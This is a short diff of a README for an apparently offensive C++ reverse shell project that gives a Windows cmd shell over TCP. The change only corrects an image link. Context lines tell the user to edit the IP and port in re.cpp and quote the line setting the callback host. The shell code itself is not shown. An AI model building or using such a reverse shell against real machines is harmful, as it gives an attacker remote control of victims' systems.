@@ -15,7 +15,7 @@ This is a simple C++ based reverse shell give us a windows  cmd shell over TCP .
 
 There is **re.cpp** file you have to open and change the **ip address** and **port number**
 
-![alt text](https://github.com/Hokori-ykm/rc/master/img/re.PNG)
+![alt text](https://github.com/Hokori-ykm/rc/blob/master/img/re.PNG)
 
     70 else {
     71    char host[] = "192.168.0.101";  // change this to your ip address
